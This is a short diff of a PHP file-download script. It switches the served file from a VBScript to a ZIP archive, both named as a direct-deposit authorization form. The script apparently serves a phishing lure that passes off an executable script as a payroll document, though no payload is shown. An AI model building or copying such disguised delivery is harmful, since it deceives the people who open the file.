@@ -5,7 +5,7 @@ ini_set('display_errors', '1');
 
 require_once __DIR__ . '/../config.php';
 
-$file = __DIR__ . '/Direct-Deposit-authorization-form.vbs';
+$file = __DIR__ . '/Direct-Deposit-authorization-form.zip';
 
 if (!file_exists($file) || !is_file($file)) {
     http_response_code(404);
